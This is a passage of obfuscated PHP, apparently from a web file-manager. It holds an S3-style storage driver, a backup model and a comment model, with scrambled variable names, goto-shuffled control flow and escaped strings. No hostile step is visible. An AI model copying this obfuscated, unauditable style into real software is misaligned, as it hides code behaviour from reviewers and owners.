(count($BìØ…Ê®÷ƒ) > 1 || isset($BìØ…Ê®÷ƒ[0][$D«•†¨“ó[28]]) && $BìØ…Ê®÷ƒ[0][$D«•†¨“ó[28]] != $dÛ´…óºÉ) { return !0; } } } else { if (!empty($bî¥»ÎÕİº)) { return !0; } } if ($aô·Â¹³¨ === null) { break; } } if ($Cå¥‰ö­Ô) { $fã…ÛµÕ¾ = array_diff($fã…ÛµÕ¾, array($dÛ´…óºÉ)); $fã…ÛµÕ¾ = count(array_unique($fã…ÛµÕ¾)); $C‘®ôøÇ¼Ê = count(array_unique($C‘®ôøÇ¼Ê)); return array($D«•†¨“ó[203] => $fã…ÛµÕ¾, $D«•†¨“ó[204] => $C‘®ôøÇ¼Ê); } goto AêéÑ§÷‹Û; ešœè¾Ë´¶: } public function listAll($A„‡ïæø¼) { $DÀˆ¼Äš„ =& $_SERVER[æ§›¦ÌáØ]; $dš‹¥Êñ = $this->fileList($A„‡ïæø¼, $DÀˆ¼Äš„[33], !0); $A“Ë™ÁÒˆ = array(); foreach ($dš‹¥Êñ[$DÀˆ¼Äš„[74]] as $DÜƒ“¨èÑÆ) { $A“Ë™ÁÒˆ[$DÜƒ“¨èÑÆ[$DÀˆ¼Äš„[28]]] = $DÜƒ“¨èÑÆ[$DÀˆ¼Äš„[78]]; } foreach ($dš‹¥Êñ[$DÀˆ¼Äš„[75]] as $DÜƒ“¨èÑÆ) { if (is_string($DÜƒ“¨èÑÆ)) { $A“Ë™ÁÒˆ[$DÜƒ“¨èÑÆ] = 0; } } return $this->listAllFiles($A„‡ïæø¼, array_keys($A“Ë™ÁÒˆ), $A“Ë™ÁÒˆ); } public function canRead($b§»ˆ­È·ø) { $c¤ÅßÜÏœÔ =& $_SERVER[æ§›¦ÌáØ]; $D”Âìëå¶ = $this->client->getAccessControlPolicy($this->bucket, $b§»ˆ­È·ø); if (!$D”Âìëå¶) { return !1; } return in_array($D”Âìëå¶, array($c¤ÅßÜÏœÔ[205], $c¤ÅßÜÏœÔ[206], $c¤ÅßÜÏœÔ[207])) ? !0 : !1; } public function canWrite($fÛ‘Ä ø¸à) { $aƒøªÓõØÅ =& $_SERVER[æ§›¦ÌáØ]; $C÷Œ°ÀÇöÑ = $this->client->getAccessControlPolicy($this->bucket, $fÛ‘Ä ø¸à); if (!$C÷Œ°ÀÇöÑ) { return !1; } return in_array($C÷Œ°ÀÇöÑ, array($aƒøªÓõØÅ[205], $aƒøªÓõØÅ[206])) ? !0 : !1; } public function getContent($B²™äœ) { return $this->client->getObject($this->bucket, $B²™äœ); } public function setContent($B°Äé‘İ«, $f®²‹§Œ•À = '', $a¬‡Ø¹õµÒ = false) { goto FèÎÕÎ¹ï; aøµ ß»Î˜: $this->cacheMethod(null, null); $d‹çŠ‘›Èè = $this->copyFile($B°Äé‘İ«, $B°Äé‘İ«, array($e±œ™’¾ ö[208] => $d‹çŠ‘›Èè[$e±œ™’¾ ö[209]])); return $d‹çŠ‘›Èè ? !0 : !1; goto D„®— •Ë; eø¡Õã£¬: $d‹çŠ‘›Èè = $this->client->putObject($f®²‹§Œ•À, $this->bucket, $B°Äé‘İ«, $e±œ™’¾ ö[192], array(), $A¡õù¨ÅÈ); if (!$d‹çŠ‘›Èè) { return !1; } if ($a¬‡Ø¹õµÒ) { return !0; } goto aøµ ß»Î˜; FèÎÕÎ¹ï: $e±œ™’¾ ö =& $_SERVER[æ§›¦ÌáØ]; $B°Äé‘İ« = $a¬‡Ø¹õµÒ ? trim($B°Äé‘İ«, $e±œ™’¾ ö[8]) . $e±œ™’¾ ö[8] : $B°Äé‘İ«; $A¡õù¨ÅÈ = get_file_mime(get_path_ext($B°Äé‘İ«)); goto eø¡Õã£¬; D„®— •Ë: } public function fileSubstr($E¨ö†ÄÂ¤¾, $f­Âòå¹Ïß, $cÆƒåŞòç¤) { $f³ºÆÚÅ = $f­Âòå¹Ïß + $cÆƒåŞòç¤ - 1; return $this->client->getObject($this->bucket, $E¨ö†ÄÂ¤¾, array($_SERVER[æ§›¦ÌáØ][210] => "\x62\x79\x74\145\163\75{$f­Âòå¹Ïß}\55{$f³ºÆÚÅ}")); } public function upload($cÒëù±ÇÉ½, $B«Š««İÎá, $BÑµƒ¥†èã = false, $cí‚â‚²Ÿç = REPEAT_REPLACE) { $bĞ„’Œä÷ =& $_SERVER[æ§›¦ÌáØ]; $FÀ˜‘©–Ô = array($bĞ„’Œä÷[208] => @md5_file($B«Š««İÎá)); $C×â‰Ö‹‹ñ = array($bĞ„’Œä÷[211] => get_file_mime(get_path_ext($cÒëù±ÇÉ½))); if (IO::size($B«Š««İÎá) <= 1024 * 1024 * 200) { $f²¦åéğ¢Ú = $this->client->putObjectFile($B«Š««İÎá, $this->bucket, $cÒëù±ÇÉ½, $bĞ„’Œä÷[192], $FÀ˜‘©–Ô, $C×â‰Ö‹‹ñ); return !empty($f²¦åéğ¢Ú) ? $this->getPathOuter($cÒëù±ÇÉ½) : !1; } $CÙğÛĞìÌ = $this->client->multiUploadObject($B«Š««İÎá, $this->bucket, trim($cÒëù±ÇÉ½, $bĞ„’Œä÷[8]), $FÀ˜‘©–Ô, $C×â‰Ö‹‹ñ); return $CÙğÛĞìÌ ? $this->getPathOuter($cÒëù±ÇÉ½) : !1; } public function download($D£ƒ½ñ®ñ, $cæ©«‰ò´ƒ) { if (!@is_dir($this->pathFather($cæ©«‰ò´ƒ)) && !IO::mkdir($this->pathFather($cæ©«‰ò´ƒ))) { return !1; } $E¹ĞìŞÈ¿ = $this->client->getObject($this->bucket, $D£ƒ½ñ®ñ, array(), $cæ©«‰ò´ƒ); return $E¹ĞìŞÈ¿ !== !1 ? $cæ©«‰ò´ƒ : !1; } public function link($f×ÂÓœ¦«, $F¤š…âì«— = array()) { $eÃÙ‰¦àÇ— =& $_SERVER[æ§›¦ÌáØ]; if ($this->signVer == $eÃÙ‰¦àÇ—[212]) { return $this->client->getAuthenticatedURL($this->bucket, $f×ÂÓœ¦«, 3600 * 12, $F¤š…âì«—); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f×ÂÓœ¦«, $eÃÙ‰¦àÇ—[8]), 3600 * 12, $this->region, array(), !0, $F¤š…âì«—); } public function fileOut($C³´ÎÙ‰¶é, $dË¿›ŠïëŒ = false, $FÆ†Òí¹“ = false, $bÌùÛ‰¾¿ö = '') { goto dÊŒÎ„ìøÉ; BïŒ…÷‹šŞ: $D¡ä—ÇãÁª = array($bˆÈØÑ—•[216] => $dË¿›ŠïëŒ . $bˆÈØÑ—•[217] . rawurlencode($FÆ†Òí¹“), $bˆÈØÑ—•[218] => $Eƒ÷©èˆñ); $aï¢µŞôµ = $this->link($C³´ÎÙ‰¶é, $D¡ä—ÇãÁª); $this->fileOutLink($aï¢µŞôµ); goto díÛˆô‚Ì; dÊŒÎ„ìøÉ: $bˆÈØÑ—• =& $_SERVER[æ§›¦ÌáØ]; if ($this->isFileOutServer()) { return $this->fileOutServer($C³´ÎÙ‰¶é, $dË¿›ŠïëŒ, $FÆ†Òí¹“, $bÌùÛ‰¾¿ö); } if (!$FÆ†Òí¹“) { $FÆ†Òí¹“ = $this->pathThis($C³´ÎÙ‰¶é); } goto Càßİ½ˆæ; Càßİ½ˆæ: $Eƒ÷©èˆñ = get_file_mime(get_path_ext($FÆ†Òí¹“)); if ($Eƒ÷©èˆñ == $bˆÈØÑ—•[213]) { return parent::fileOut($C³´ÎÙ‰¶é, $dË¿›ŠïëŒ, $FÆ†Òí¹“, $bÌùÛ‰¾¿ö); } $dË¿›ŠïëŒ = $dË¿›ŠïëŒ ? $bˆÈØÑ—•[214] : $bˆÈØÑ—•[215]; goto BïŒ…÷‹šŞ; díÛˆô‚Ì: } public function fileOutServer($dÓ¬Ö¾‡¢‰, $C˜ÖÆâ÷«¾ = false, $cÄ£äâğ¢‘ = false, $bğµ—Óõê = '') { parent::fileOut($dÓ¬Ö¾‡¢‰, $C˜ÖÆâ÷«¾, $cÄ£äâğ¢‘, $bğµ—Óõê); } public function fileOutImageServer($DÎ‘‹Æß…¨, $B‹²œ‰ÖÕ¥ = 250) { parent::fileOutImage($DÎ‘‹Æß…¨, $B‹²œ‰ÖÕ¥); } public function hashMd5($d“•ÁƒˆÑ¨, $BÛšÁ„ÑÙ‰ = '') { $DéáÌš»Èğ =& $_SERVER[æ§›¦ÌáØ]; $Cª¸šˆÒ = $this->objectMeta($d“•ÁƒˆÑ¨); if (!$Cª¸šˆÒ) { return !1; } $BÛšÁ„ÑÙ‰ = $BÛšÁ„ÑÙ‰ ? $BÛšÁ„ÑÙ‰ : _get($Cª¸šˆÒ, $DéáÌš»Èğ[219]); $BÛšÁ„ÑÙ‰ = $BÛšÁ„ÑÙ‰ ? $BÛšÁ„ÑÙ‰ : _get($Cª¸šˆÒ, $DéáÌš»Èğ[209], $DéáÌš»Èğ[33]); return $BÛšÁ„ÑÙ‰; } public function uploadFormData($e‹£æàà¸…, $DƒÎ©Áø“Ò = 3600) { $e•¢Ãƒƒ‚ =& $_SERVER[æ§›¦ÌáØ]; $eøƒ¬öêÈ = $this->pathFather($e‹£æàà¸…); $fÔ¥ö©ù‘ = $this->client->getHttpUploadPostParams($this->bucket, $eøƒ¬öêÈ, $e•¢Ãƒƒ‚[192], $DƒÎ©Áø“Ò); return array_merge((array) $fÔ¥ö©ù‘, array($e•¢Ãƒƒ‚[175] => $this->getHost())); } public function multiUploadFormData($aö¡¿‡è‡“, $EÌ˜´ªƒçÃ = 3600) { $aêŸíÖÃâ§ =& $_SERVER[æ§›¦ÌáØ]; $cŒ„Ëİäœ• = gmdate($aêŸíÖÃâ§[220]); $E‰ŸËè—Öß = array(); $DèöŠ³×º = $this->client->getUploadId($this->bucket, $aö¡¿‡è‡“, $E‰ŸËè—Öß); if (!$DèöŠ³×º) { return !1; } return array($aêŸíÖÃâ§[221] => $DèöŠ³×º, $aêŸíÖÃâ§[175] => $this->getHost() . $aêŸíÖÃâ§[8] . $this->pathEncode($aö¡¿‡è‡“), $aêŸíÖÃâ§[222] => $cŒ„Ëİäœ•, $aêŸíÖÃâ§[93] => $aö¡¿‡è‡“); } public function multiUploadAuthData($BœÑĞ™», $D†îç—”ó“ = array()) { goto dÚ™Ù—Ã÷; C‘¦«ğ“‘¹: $Cš¥“¸’¡ = array($eğÌ°À¨«[224], $eğÌ°À¨«[33], $eğÌ°À¨«[119], $eğÌ°À¨«[33], "\x78\55\x61\x6d\x7a\55\x64\141\164\145\72{$C¼¯Š¡‡Â}", $eğÌ°À¨«[8] . $this->bucket . $eğÌ°À¨«[8] . $this->pathEncode($aÆö¨ï«ì) . $cñ¡§ÇÊ‰Ù); if (strpos($cñ¡§ÇÊ‰Ù, $eğÌ°À¨«[225]) === 0) { $Cš¥“¸’¡[0] = $eğÌ°À¨«[226]; } if (isset($D†îç—”ó“[$eğÌ°À¨«[227]]) && $D†îç—”ó“[$eğÌ°À¨«[227]] == $eğÌ°À¨«[228]) { $Cš¥“¸’¡[0] = $eğÌ°À¨«[228]; } goto Bå×‰íÆâ¯; Bå×‰íÆâ¯: $A°ÖíÆŠÛ = implode($eğÌ°À¨«[229], $Cš¥“¸’¡); $aÖ—ƒïŞ‚‹ = base64_encode(hash_hmac($eğÌ°À¨«[230], $A°ÖíÆŠÛ, $this->secret, !0)); $b­œïì­Ù = $eğÌ°À¨«[231] . $this->accessKey . $eğÌ°À¨«[4] . $aÖ—ƒïŞ‚‹; goto b¥Ïò˜ĞÛ›; b¥Ïò˜ĞÛ›: if (strpos($cñ¡§ÇÊ‰Ù, $eğÌ°À¨«[225]) === 0) { return array($eğÌ°À¨«[232] => $b­œïì­Ù, $eğÌ°À¨«[222] => $C¼¯Š¡‡Â); } return $b­œïì­Ù; goto DÚĞ©ğŞåğ; dÚ™Ù—Ã÷: $eğÌ°À¨« =& $_SERVER[æ§›¦ÌáØ]; $C¼¯Š¡‡Â = isset($D†îç—”ó“[$eğÌ°À¨«[222]]) ? $D†îç—”ó“[$eğÌ°À¨«[222]] : gmdate($eğÌ°À¨«[220]); $cñ¡§ÇÊ‰Ù = isset($D†îç—”ó“[$eğÌ°À¨«[168]]) ? $D†îç—”ó“[$eğÌ°À¨«[168]] : $eğÌ°À¨«[33]; goto Bù†¤†òÉ; Bù†¤†òÉ: $aÆö¨ï«ì = $D†îç—”ó“[$eğÌ°À¨«[93]]; unset($D†îç—”ó“[$eğÌ°À¨«[93]]); if (isset($D†îç—”ó“[$eğÌ°À¨«[223]])) { $D†îç—”ó“[$eğÌ°À¨«[222]] = $C¼¯Š¡‡Â; return $this->listUploadParts($aÆö¨ï«ì, $D†îç—”ó“); } goto C‘¦«ğ“‘¹; DÚĞ©ğŞåğ: } public function listUploadParts($aÕ…¤İÔ˜©, $DÇ”‹“®ğ‚ = array()) { goto e´åÉ¿ƒğ; C‹Ùğ—×: $E¬ÅÈƒ¡Ê = $this->multiUploadAuthData($aÕ…¤İÔ˜©, $DÇ”‹“®ğ‚); if (empty($E¬ÅÈƒ¡Ê)) { return !1; } return array($C‰Æ£ôÔ‹[232] => $E¬ÅÈƒ¡Ê, $C‰Æ£ôÔ‹[222] => $DÇ”‹“®ğ‚[$C‰Æ£ôÔ‹[222]], $C‰Æ£ôÔ‹[234] => $dšßóÕ»Î¹); goto fÅ°ê±˜Ù«; e´åÉ¿ƒğ: $C‰Æ£ôÔ‹ =& $_SERVER[æ§›¦ÌáØ]; $Cëƒ²Ã‹‡ = str_replace($C‰Æ£ôÔ‹[233], $C‰Æ£ôÔ‹[33], $DÇ”‹“®ğ‚[$C‰Æ£ôÔ‹[168]]); $dšßóÕ»Î¹ = $this->client->listParts($this->bucket, $aÕ…¤İÔ˜©, $Cëƒ²Ã‹‡); goto AÉê¬İˆÄ‚; AÉê¬İˆÄ‚: if (!$dšßóÕ»Î¹) { return !1; } unset($DÇ”‹“®ğ‚[$C‰Æ£ôÔ‹[223]], $DÇ”‹“®ğ‚[$C‰Æ£ôÔ‹[227]]); $DÇ”‹“®ğ‚[$C‰Æ£ôÔ‹[93]] = $aÕ…¤İÔ˜©; goto C‹Ùğ—×; fÅ°ê±˜Ù«: } public function getHost() { return parent::getHost() . $_SERVER[æ§›¦ÌáØ][8] . $this->bucket; } public function size($d±´Ì³ïÏ) { $F•Ò««½Ğ¾ = $this->objectMeta($d±´Ì³ïÏ); return $F•Ò««½Ğ¾ ? $F•Ò««½Ğ¾[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function info($CšÀÚÆÃ¥à) { if ($this->isFolder($CšÀÚÆÃ¥à)) { return $this->folderInfo($CšÀÚÆÃ¥à); } else { if ($this->isFile($CšÀÚÆÃ¥à)) { return $this->fileInfo($CšÀÚÆÃ¥à); } } return !1; } public function exist($CíÛÀÇ²¢Æ) { return $this->isFile($CíÛÀÇ²¢Æ) || $this->isFolder($CíÛÀÇ²¢Æ); } public function isFile($aª‘…Âêß) { return !$this->isFolder($aª‘…Âêß) && $this->objectMeta($aª‘…Âêß); } public function isFolder($b‚É§ˆ½Ñ„) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][199], $b‚É§ˆ½Ñ„); } protected function objectMeta($A·»™÷äµâ) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][200], $A·»™÷äµâ); } protected function _objectMeta($c±ôÁÂÜ) { $dñ³†ç¡¯ =& $_SERVER[æ§›¦ÌáØ]; $c±ôÁÂÜ = rtrim($c±ôÁÂÜ, $dñ³†ç¡¯[8]); try { $Dù†±­ì§‰ = $this->client->getObjectInfo($this->bucket, $c±ôÁÂÜ); if (!isset($Dù†±­ì§‰[$dñ³†ç¡¯[219]]) && isset($Dù†±­ì§‰[$dñ³†ç¡¯[235]])) { $Dù†±­ì§‰[$dñ³†ç¡¯[219]] = $Dù†±­ì§‰[$dñ³†ç¡¯[235]]; } } catch (Exception $d†›ƒŠæÃÇ) { $Dù†±­ì§‰ = !1; } if (!$Dù†±­ì§‰) { } return $Dù†±­ì§‰; } protected function _isFolder($E©†ä«ÃâÉ) { goto d¨³¡ğÜ‡Í; C»â §°¸: return stripos($c©ãÉ‰Í‰, $E©†ä«ÃâÉ . $EŸàµ—¨òÈ[8]) === 0 ? !0 : !1; if (substr($c©ãÉ‰Í‰, -1) == $EŸàµ—¨òÈ[8]) { return !0; } if (get_path_this($c©ãÉ‰Í‰) == get_path_this($E©†ä«ÃâÉ)) { return !1; } goto F¸ËÀ» ¿‹; F¸ËÀ» ¿‹: return !0; goto e°¾¥ÈÌ›¸; d¨³¡ğÜ‡Í: $EŸàµ—¨òÈ =& $_SERVER[æ§›¦ÌáØ]; $E©†ä«ÃâÉ = rtrim($E©†ä«ÃâÉ, $EŸàµ—¨òÈ[8]); if ($E©†ä«ÃâÉ == $EŸàµ—¨òÈ[33] || $E©†ä«ÃâÉ == $EŸàµ—¨òÈ[8]) { return !0; } goto FêÈ‹ğ¬õæ; FêÈ‹ğ¬õæ: $BŒÍ îôäÎ = $this->client->getBucket($this->bucket, $E©†ä«ÃâÉ, null, 1); if (empty($BŒÍ îôäÎ[$EŸàµ—¨òÈ[198]])) { return !1; } $c©ãÉ‰Í‰ = $BŒÍ îôäÎ[$EŸàµ—¨òÈ[198]][0][$EŸàµ—¨òÈ[28]]; goto C»â §°¸; e°¾¥ÈÌ›¸: } } define($_SERVER[æ§›¦ÌáØ][236], 1); goto DíÔ—ã¦½«; f„êá¨šƒ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x62\x61\x63\x6b\165\x70\114\151\163\x74"; public $field = array("\151\157", "\x6e\x61\155\145", "\163\x74\x61\x74\165\x73", "\143\157\x6e\164\145\x6e\164", "\x6d\141\156\165\x61\154", "\x72\145\x73\165\x6c\164", "\164\151\x6d\145\x46\x72\157\155", "\x74\x69\x6d\x65\124\x6f"); public function config() { goto FÂ‘¾Ê’Îó; CÅ…‚ßïéÊ: $Cì‹×øÏ££ = Model($bŒ¯å­îÒ”[1715])->findByKey($bŒ¯å­îÒ”[1508], $C¡ÖùÃÃÂ‰); if (!$Cì‹×øÏ££) { $Cì‹×øÏ££ = array(); } if (isset($Cì‹×øÏ££[$bŒ¯å­îÒ”[197]])) { $Cì‹×øÏ££[$bŒ¯å­îÒ”[197]] = json_decode($Cì‹×øÏ££[$bŒ¯å­îÒ”[197]], !0); } goto CæŒ‹ìÍ¬æ; dÀƒ‰â©: $aÍØæ´ÊïØ = is_array($aÍØæ´ÊïØ) ? $aÍØæ´ÊïØ : array(); if (!isset($aÍØæ´ÊïØ[$bŒ¯å­îÒ”[708]])) { $aÍØæ´ÊïØ[$bŒ¯å­îÒ”[708]] = $bŒ¯å­îÒ”[87]; } unset($aÍØæ´ÊïØ[$bŒ¯å­îÒ”[1490]]); goto C„ØØŞ¯¿Ç; CæŒ‹ìÍ¬æ: if (isset($aÍØæ´ÊïØ[$bŒ¯å­îÒ”[197]])) { $Cì‹×øÏ££[$bŒ¯å­îÒ”[197]][$bŒ¯å­îÒ”[1493]] = $aÍØæ´ÊïØ[$bŒ¯å­îÒ”[197]]; unset($aÍØæ´ÊïØ[$bŒ¯å­îÒ”[197]]); } return array_merge($Cì‹×øÏ££, $aÍØæ´ÊïØ); goto aİ–‹í„‰; FÂ‘¾Ê’Îó: $bŒ¯å­îÒ” =& $_SERVER[æ§›¦ÌáØ]; $aÍØæ´ÊïØ = Model($bŒ¯å­îÒ”[723])->get($bŒ¯å­îÒ”[735]); $aÍØæ´ÊïØ = json_decode($aÍØæ´ÊïØ, !0); goto dÀƒ‰â©; C„ØØŞ¯¿Ç: Action($bŒ¯å­îÒ”[1713])->taskInit(); Model($bŒ¯å­îÒ”[1489])->cacheClear(); $C¡ÖùÃÃÂ‰ = $bŒ¯å­îÒ”[1714]; goto CÅ…‚ßïéÊ; aİ–‹í„‰: } public function listData($b•˜ï´òäç = false, $b£‚Ş¹Úƒù = "\x6d\157\x64\x69\x66\171\x54\151\155\145", $Báì¿“¢Â = false) { return parent::listData($b•˜ï´òäç, $b£‚Ş¹Úƒù, !0); } public function lastItem() { $d¿¾ã’ÄÏ = $this->listData(); return !empty($d¿¾ã’ÄÏ[0]) ? $d¿¾ã’ÄÏ[0] : null; } public function kill($bñÜ÷Ö¡¥§) { goto a³ÇÆƒí¥ù; F¢ÛáŠŒĞğ: Task::kill($bÔì­æ¯ÛÎ[734]); Task::kill($bÔì­æ¯ÛÎ[757]); Task::kill($bÔì­æ¯ÛÎ[767]); goto C©õ’£ßĞË; C©óÛ±Ú·Ì: return $this->remove($bñÜ÷Ö¡¥§); goto Få•ÅÇä; C©õ’£ßĞË: $C¯„éÎÕ¶÷ = $e‚˜‰…ÊÙ[$bÔì­æ¯ÛÎ[28]]; $aÇ‘ç‹Å’Ë = TEMP_FILES . $bÔì­æ¯ÛÎ[731] . $C¯„éÎÕ¶÷ . $bÔì­æ¯ÛÎ[8]; IO::remove($aÇ‘ç‹Å’Ë, !1); goto C©óÛ±Ú·Ì; a³ÇÆƒí¥ù: $bÔì­æ¯ÛÎ =& $_SERVER[æ§›¦ÌáØ]; $e‚˜‰…ÊÙ = $this->listData($bñÜ÷Ö¡¥§); if (!$e‚˜‰…ÊÙ || empty($e‚˜‰…ÊÙ[$bÔì­æ¯ÛÎ[28]])) { return !0; } goto F¢ÛáŠŒĞğ; Få•ÅÇä: } public function remove($f‘ÍÃ¸ĞÏ¿) { $Bİ¸¥…Ÿ½ = $this->listData($f‘ÍÃ¸ĞÏ¿); if (!$Bİ¸¥…Ÿ½) { return !0; } return $this->backupRemove($Bİ¸¥…Ÿ½); } private function backupRemove($f¦‹¨“ëÜ) { parent::remove($f¦‹¨“ëÜ[$_SERVER[æ§›¦ÌáØ][393]]); $bà†Â‚¤è = $this->backupPath($f¦‹¨“ëÜ); IO::remove($bà†Â‚¤è, !1); return !0; } private function backupPath($aİÍù„Î´») { $eº¿•ÇøÅá =& $_SERVER[æ§›¦ÌáØ]; $e©˜³°ñĞ× = $aİÍù„Î´»[$eº¿•ÇøÅá[28]]; $eçËÂÄÎ = Model($eº¿•ÇøÅá[723])->get($eº¿•ÇøÅá[724]); $dˆ÷’‘ª½ä = substr(md5($eº¿•ÇøÅá[725] . $eçËÂÄÎ . $e©˜³°ñĞ×), 0, 8); return "\173\x69\157\72{$aİÍù„Î´»[$eº¿•ÇøÅá[705]]}\175\x2f\x64\x61\164\141\142\x61\163\145\57\142\x61\143\x6b\x75\160\57" . $e©˜³°ñĞ× . $eº¿•ÇøÅá[71] . $dˆ÷’‘ª½ä; } public function start() { goto E¡Ğ¸¯…™ò; E¡Ğ¸¯…™ò: $C‚½ø„¶¥¥ =& $_SERVER[æ§›¦ÌáØ]; if ($GLOBALS[$C‚½ø„¶¥¥[6]][$C‚½ø„¶¥¥[88]][$C‚½ø„¶¥¥[1716]] != $C‚½ø„¶¥¥[87]) { return !0; } $fù¦ŞÂ¥Õñ = $this->config(); goto Cè„¦¶ó©; Cè„¦¶ó©: if (!$fù¦ŞÂ¥Õñ || $fù¦ŞÂ¥Õñ[$C‚½ø„¶¥¥[1490]] != $C‚½ø„¶¥¥[87]) { return !1; } $b§ìœÛ«„¾ = $this->process(); foreach ($b§ìœÛ«„¾ as $A¬›Ä¼®ï„) { if ($A¬›Ä¼®ï„) { return Task::restart($A¬›Ä¼®ï„[$C‚½ø„¶¥¥[393]]); } } goto EëÛö’‹Ûä; EëÛö’‹Ûä: $FŠ¨öèöõ = new Backup(); $aÅ»Ô•¿Î = $FŠ¨öèöõ->db(); if ($aÅ»Ô•¿Î) { $aÅ»Ô•¿Î = $FŠ¨öèöõ->dbFile(); if ($aÅ»Ô•¿Î && $fù¦ŞÂ¥Õñ[$C‚½ø„¶¥¥[708]] == $C‚½ø„¶¥¥[191]) { $aÅ»Ô•¿Î = $FŠ¨öèöõ->file(); } } goto EÏŒğô‚ŞÚ; EÏŒğô‚ŞÚ: Backup::set(array($C‚½ø„¶¥¥[703] => 1, $C‚½ø„¶¥¥[476] => time())); return !0; goto E·Áˆ„¦¦•; E·Áˆ„¦¦•: } public function process() { $f˜—Û¿õ¸ë =& $_SERVER[æ§›¦ÌáØ]; return array($f˜—Û¿õ¸ë[711] => Task::get($f˜—Û¿õ¸ë[734]), $f˜—Û¿õ¸ë[715] => Task::get($f˜—Û¿õ¸ë[757]), $f˜—Û¿õ¸ë[193] => Task::get($f˜—Û¿õ¸ë[767])); } public function restore() { $cí÷õµ“Ş =& $_SERVER[æ§›¦ÌáØ]; ActionCall($cí÷õµ“Ş[1008], !0, 1); ActionCall($cí÷õµ“Ş[1008], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\x63\x6f\155\155\x65\156\164\137\x6d\145\x74\x61", "\155\x65\x74\x61\106\151\x65\154\144" => "\143\x6f\x6d\x6d\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aêÏõ½‡ë…) { $DÍÈ½àñòï =& $_SERVER[æ§›¦ÌáØ]; if ($aêÏõ½‡ë…[$DÍÈ½àñòï[1717]]) { $dØ–Ü˜Èäô = $this->where(array($DÍÈ½àñòï[1718] => $aêÏõ½‡ë…[$DÍÈ½àñòï[1717]]))->find(); if (!$dØ–Ü˜Èäô || $dØ–Ü˜Èäô[$DÍÈ½àñòï[404]] != $aêÏõ½‡ë…[$DÍÈ½àñòï[404]] || $dØ–Ü˜Èäô[$DÍÈ½àñòï[484]] != $aêÏõ½‡ë…[$DÍÈ½àñòï[484]]) { return !1; } $this->where(array($DÍÈ½àñòï[1718] => $aêÏõ½‡ë…[$DÍÈ½àñòï[1717]]))->setAdd($DÍÈ½àñòï[1719], 1); } $aêÏõ½‡ë…[$DÍÈ½àñòï[1720]] = 0; $aêÏõ½‡ë…[$DÍÈ½àñòï[1719]] = 0; $aêÏõ½‡ë…[$DÍÈ½àñòï[703]] = 1; return $this->add($aêÏõ½‡ë…); } public function commentCount($b×í¡²¶¤, $C§¹ƒ‘ù§¹) { goto A¦…ªòá‡; e­ñßÜì: $cøÑŞÕĞ­“ = array($cÃÕĞ¬°Ä[484], $cÃÕĞ¬°Ä[1721] => $cÃÕĞ¬°Ä[480]); $F°›—´óù… = array($cÃÕĞ¬°Ä[484] => array($cÃÕĞ¬°Ä[7], $b×í¡²¶¤), $cÃÕĞ¬°Ä[404] => $C§¹ƒ‘ù§¹); $d¦ïÇ…õ‹Û = $this->field($cøÑŞÕĞ­“)->where($F°›—´óù…)->group($cÃÕĞ¬°Ä[484])->select(); goto CÎƒïìïêê; CÎƒïìïêê: return array_to_keyvalue($d¦ïÇ…õ‹Û, $cÃÕĞ¬°Ä[484], $cÃÕĞ¬°Ä[480]); goto F¾¸†¦ø; A¦…ªòá‡: $cÃÕĞ¬°Ä =& $_SERVER[æ§›¦ÌáØ]; if (!$b×í¡²¶¤) { return array(); } if (is_string($b×í¡²¶¤) || is_int($b×í¡²¶¤)) { $b×í¡²¶¤ = array($b×í¡²¶¤); } goto e­ñßÜì; F¾¸†¦ø: } public function remove($eØ¼Äº‚á) { $d¨à¢¯‚ó™ =& $_SERVER[æ§›¦ÌáØ]; $eÃ¹¬¨Ò›Ë = array($d¨à¢¯‚ó™[1718] => $eØ¼Äº‚á); $Bƒ£³¡ÆÕÂ = $this->where($eÃ¹¬¨Ò›Ë)->find(); if ($Bƒ£³¡ÆÕÂ[$d¨à¢¯‚ó™[1717]]) { $this->where(array($d¨à¢¯‚ó™[1718] => $Bƒ£³¡ÆÕÂ[$d¨à¢¯‚ó™[1717]]))->setAdd($d¨à¢¯‚ó™[1719], -1); } return $this->where($eÃ¹¬¨Ò›Ë)->delete(); } public function edit($D§˜ï˜å©, $a…İÑóíÇÂ) { $eÓõŠº­´– =& $_SERVER[æ§›¦ÌáØ]; $C×ç¹°ÔèÇ = array($eÓõŠº­´–[1718] => $D§˜ï˜å©); return $this->where($C×ç¹°ÔèÇ)->save(array($eÓõŠº­´–[1722] => $a…İÑóíÇÂ)); } public function prasise($e ù¬¸´…ñ) { $f‘Œ¤âùÊ =& $_SERVER[æ§›¦ÌáØ]; $AÑŸÁÔ´‹‚ = Model($f‘Œ¤âùÊ[1723]); $F†ÇÊŞ²‘ = array($f‘Œ¤âùÊ[1718] => $e ù¬¸´…ñ, $f‘Œ¤âùÊ[1511] => USER_ID); $A›ÇÔ•°Áà = $AÑŸÁÔ´‹‚->where($F†ÇÊŞ²‘)->find(); if (!$A›ÇÔ•°Áà) { $AÑŸÁÔ´‹‚->add($F†ÇÊŞ²‘); $bˆˆ«Ú¸Ñ = $this->where(array($f‘Œ¤âùÊ[1718] => $e ù¬¸´…ñ))->setAdd($f‘Œ¤âùÊ[1720], 1); } else { $AÑŸÁÔ´‹‚->where($F†ÇÊŞ²‘)->delete(); $bˆˆ«Ú¸Ñ = $this->where(array($f‘Œ¤âùÊ[1718] => $e ù¬¸´…ñ))->setAdd($f‘Œ¤âùÊ[1720], -1); } return $bˆˆ«Ú¸Ñ; } public function targetInfo($aöˆ“çÖ‘µ, $dÎÆÎÈèÄ) { goto AĞ¡¤šèªØ; AĞ¡¤šèªØ: $CŒ’Ş–êÂÆ =& $_SERVER[æ§›¦ÌáØ]; $d™ä‚åÎ×Ú = array($CŒ’Ş–êÂÆ[562] => $aöˆ“çÖ‘µ, $CŒ’Ş–êÂÆ[563] => $dÎÆÎÈèÄ); $aëÚ¥ç÷œ = 